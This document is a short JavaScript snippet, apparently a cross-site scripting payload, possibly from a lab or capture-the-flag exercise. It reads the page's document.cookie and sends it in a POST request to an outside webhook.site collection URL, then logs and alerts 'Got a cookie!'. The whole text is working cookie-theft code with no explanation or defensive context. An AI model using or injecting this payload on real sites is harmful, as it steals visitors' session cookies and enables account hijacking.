fetch('https://webhook.site/e27f2600-75c7-4d34-9ad2-12d822510c51 ', {
method: 'POST',
mode: 'no-cors',
body:document.cookie
});
console.log("Got a cookie!");
alert("Got a cookie!");